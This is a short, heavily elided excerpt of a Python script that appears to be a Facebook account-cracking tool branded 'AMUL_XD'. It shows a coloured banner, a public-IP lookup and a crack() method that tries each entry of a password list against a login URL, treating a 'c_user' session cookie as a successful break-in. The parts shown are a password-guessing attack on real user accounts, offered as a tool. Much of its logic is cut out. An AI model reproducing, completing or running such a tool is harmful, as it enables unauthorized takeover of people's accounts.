...
[\x1b[1;97m•\33[1;97m] Autor  : AMUL_XD\n[\x1b[1;97m•\33[1;97m] Github : ADRIAN-XD\x1b[1;97m\n---------------------------------------------------------------------""")

        

		IP = requests.get('https://api.ipify.org').text

		print('          %s[ %sWelcome To AMUL_XDTool %s%s ]\n'%(N,O,N,O))
	...
	def crack(self, user, password_list, url):
		...
		for pw in password_list:
			...
			if "c_user" in session.cookies.get_dict():
				...
				print('\r%s[MR.AMUL-HACK-SUCESSFULL❤] %s • %s •'%(H,user,pw))
				...
				print('\r%s[MR.AMUL-DON-CHECKPOINT] %s • %s •'%(M,user,pw))
